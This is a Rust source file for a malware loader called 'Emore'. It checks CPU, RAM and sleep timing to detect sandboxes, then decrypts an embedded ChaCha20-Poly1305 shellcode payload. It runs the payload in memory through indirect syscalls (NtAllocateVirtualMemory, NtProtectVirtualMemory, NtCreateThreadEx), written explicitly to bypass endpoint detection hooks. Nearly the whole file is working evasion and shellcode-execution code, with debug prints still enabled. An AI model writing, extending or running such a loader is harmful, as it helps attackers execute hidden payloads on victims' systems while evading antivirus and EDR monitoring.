// #![windows_subsystem = "windows"] // DEBUG: Temporarily disabled to see console output

mod syscalls; // Indirect syscall module for EDR evasion

use chacha20poly1305::{ // For ChaCha20-Poly1305 encryption/decryption
    aead::{Aead, KeyInit}, // For Aead trait and KeyInit
    ChaCha20Poly1305, Key, Nonce, // Specific types
};
use std::process; // For process exit
use std::ptr; // For raw pointer operations
use sysinfo::{System, SystemExt}; // For system information (RAM check)
use base64::engine::Engine as _; // Engine for base64 encoding/decoding
use base64::engine::general_purpose::STANDARD;  // General purpose base64 engine
use std::thread; // For sleep functionality
use std::time::{Duration, Instant}; // For timing checks

// Include the encrypted payload and associated key/nonce
include!(concat!(env!("OUT_DIR"), "/payload_data.rs")); // build.rs generates this file because we need to keep the key/nonce secret

/// --- Phase 0: Evasion Constants ---
const MIN_CPUS: usize = 4; 
const MIN_RAM_BYTES: u64 = 4 * 1024 * 1024 * 1024; // 4 GB
const SLEEP_TIME_MS: u64 = 3000; // 3 seconds - evade quick scans

fn run_evasion_checks() -> bool {
    // 1. CPU Core Check
    let available_cpus = num_cpus::get();
    println!("    [*] CPU Cores: {} (Required: {})", available_cpus, MIN_CPUS);
    if available_cpus < MIN_CPUS {
        println!("    [!] FAILED: Not enough CPU cores");
        return false;
    }
    println!("    [+] CPU check passed");
    
    // 2. RAM Check
    let mut sys = System::new_all();
    sys.refresh_memory();
    let total_memory = sys.total_memory();
    let total_gb = total_memory as f64 / (1024.0 * 1024.0 * 1024.0);
    println!("    [*] RAM: {:.2} GB (Required: 4 GB)", total_gb);
    if total_memory < MIN_RAM_BYTES {
        println!("    [!] FAILED: Not enough RAM");
        return false;
    }
    println!("    [+] RAM check passed");
    
    // 3. Timing Check (Anti-Sandbox)
    println!("    [*] Performing timing check (sleeping 3 seconds)...");
    let start = Instant::now();
    thread::sleep(Duration::from_millis(SLEEP_TIME_MS));
    let elapsed = start.elapsed().as_millis();
    println!("    [*] Sleep elapsed: {} ms (Expected: {} ms)", elapsed, SLEEP_TIME_MS);
    
    if elapsed < (SLEEP_TIME_MS as u128 * 80 / 100) {
        println!("    [!] FAILED: Sleep time too short (sandbox detected)");
        return false;
    }
    println!("    [+] Timing check passed");
    
    true
}

fn main() {
    println!("[*] Emore starting...");
    
    // --- Phase 0: Evasion ---
    // This check must occur before any malicious action.
    println!("[*] Running evasion checks...");
    if !run_evasion_checks() {
        println!("[!] Sandbox detected! Exiting...");
        process::exit(0); 
    }
    println!("[+] Evasion checks passed!");
    
    // --- Phase 1: Decryption ---
    // 1. Base64 Decoding
    // Decode the ciphertext string generated by the build script.
    println!("[*] Decoding Base64 payload...");
    let ciphertext_vec = match STANDARD.decode(ENCRYPTED_PAYLOAD_BASE64) {
        Ok(data) => {
            println!("[+] Base64 decoded successfully ({} bytes)", data.len());
            data
        },
        Err(e) => {
            println!("[!] Base64 decode failed: {:?}", e);
            process::exit(1);
        }
    };
    
    // 2. ChaCha20 Setup
    // Initialize the cipher using the unique key and nonce from the build script.
    println!("[*] Initializing ChaCha20-Poly1305...");
    let key = Key::from_slice(&PAYLOAD_KEY);
    let nonce = Nonce::from_slice(&PAYLOAD_NONCE);
    let cipher = ChaCha20Poly1305::new(key);

    // 3. Decryption
    // Decrypt the actual shellcode.
    println!("[*] Decrypting payload...");
    let decrypted_payload = match cipher.decrypt(nonce, ciphertext_vec.as_ref()) {
        Ok(data) => {
            println!("[+] Payload decrypted successfully ({} bytes)", data.len());
            data
        },
        Err(e) => {
            println!("[!] Decryption failed: {:?}", e);
            process::exit(1);
        }
    };

    // --- Phase 2: Indirect Syscall Execution (EDR Bypass) ---    
    unsafe { // Unsafe block for raw pointer and FFI calls
        // Memory allocation constants
        const MEM_COMMIT: u32 = 0x1000;
        const MEM_RESERVE: u32 = 0x2000;
        const PAGE_READWRITE: u32 = 0x04;
        const PAGE_EXECUTE_READ: u32 = 0x20;
        
        // 1. Allocate Memory using NtAllocateVirtualMemory (bypasses VirtualAlloc hooks)
        println!("[*] Allocating memory ({} bytes)...", decrypted_payload.len());
        let mut base_addr: *mut u8 = ptr::null_mut();
        let mut region_size: usize = decrypted_payload.len();
        
        let status = syscalls::indirect_syscall(
            "NtAllocateVirtualMemory",
            &[
                u64::MAX,                                    // ProcessHandle (-1 = current process)
                &mut base_addr as *mut _ as u64,             // BaseAddress
                0,                                           // ZeroBits
                &mut region_size as *mut _ as u64,           // RegionSize
                (MEM_COMMIT | MEM_RESERVE) as u64,           // AllocationType
                PAGE_READWRITE as u64,                       // Protect (RW initially)
            ],
        );

        if status.is_err() || base_addr.is_null() {
            println!("[!] Memory allocation failed!");
            if let Err(e) = status {
                println!("[!] Error: {}", e);
            }
            process::exit(1);
        }
        println!("[+] Memory allocated at {:p}", base_addr);

        // 2. Copy Shellcode to allocated memory
        println!("[*] Copying shellcode to memory...");
        ptr::copy_nonoverlapping(
            decrypted_payload.as_ptr(),
            base_addr,
            decrypted_payload.len()
        );
        println!("[+] Shellcode copied successfully");
        
        // 3. Change Memory Protection to RX using NtProtectVirtualMemory (bypasses VirtualProtect hooks)
        println!("[*] Changing memory protection to RX...");
        let mut old_protect: u32 = 0;
        let mut protect_size: usize = decrypted_payload.len();
        
        let protect_status = syscalls::indirect_syscall(
            "NtProtectVirtualMemory",
            &[
                u64::MAX,                                    // ProcessHandle (-1 = current process)
                &mut base_addr as *mut _ as u64,             // BaseAddress
                &mut protect_size as *mut _ as u64,          // NumberOfBytesToProtect
                PAGE_EXECUTE_READ as u64,                    // NewAccessProtection (RX)
                &mut old_protect as *mut _ as u64,           // OldAccessProtection
            ],
        );
        
        if protect_status.is_err() {
            println!("[!] Memory protection change failed!");
            if let Err(e) = protect_status {
                println!("[!] Error: {}", e);
            }
            process::exit(1);
        }
        println!("[+] Memory protection changed to RX");

        // 4. Create Thread using NtCreateThreadEx (bypasses CreateThread hooks)
        println!("[*] Creating thread at {:p}...", base_addr);
        let mut thread_handle: usize = 0;
        
        let thread_status = syscalls::indirect_syscall(
            "NtCreateThreadEx",
            &[
                &mut thread_handle as *mut _ as u64,        // ThreadHandle
                0x1FFFFF,                                    // DesiredAccess (THREAD_ALL_ACCESS)
                0,                                           // ObjectAttributes
                u64::MAX,                                    // ProcessHandle (-1 = current)
                base_addr as u64,                            // StartRoutine (shellcode entry)
                0,                                           // Argument
                0,                                           // CreateFlags (0 = run immediately)
                0,                                           // ZeroBits
                0,                                           // StackSize
                0,                                           // MaximumStackSize
                0,                                           // AttributeList
            ],
        );

        if thread_status.is_err() || thread_handle == 0 {
            println!("[!] Thread creation failed!");
            if let Err(e) = thread_status {
                println!("[!] Error: {}", e);
            }
            process::exit(1);
        }
        println!("[+] Thread created successfully (Handle: 0x{:X})", thread_handle);
        println!("[*] Payload executing...");

        // 5. Wait for thread completion using NtWaitForSingleObject
        println!("[*] Waiting for payload to complete...");
        let wait_result = syscalls::indirect_syscall(
            "NtWaitForSingleObject",
            &[
                thread_handle as u64,                        // Handle
                0,                                           // Alertable (FALSE)
                0,                                           // Timeout (NULL = infinite)
            ],
        );
        
        if let Ok(status) = wait_result {
            println!("[+] Payload completed with status: 0x{:08X}", status as u32);
        }
    }
    
    println!("[*] Emore finished!");
}